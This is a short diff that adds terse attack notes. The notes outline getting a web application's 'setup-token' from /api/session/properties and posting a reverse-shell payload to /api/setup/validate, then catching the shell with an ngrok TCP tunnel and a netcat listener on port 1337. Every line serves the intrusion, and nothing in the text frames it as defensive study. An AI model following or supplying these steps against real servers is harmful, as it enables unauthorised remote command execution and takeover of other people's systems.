@@ -1,0 +1,9 @@
+api/session/properties
+find out "setup-token"
+
+change to revershell
+POST: /api/setup/validate
+
+
+ngrok tcp 1337
+nc -lvp 1337
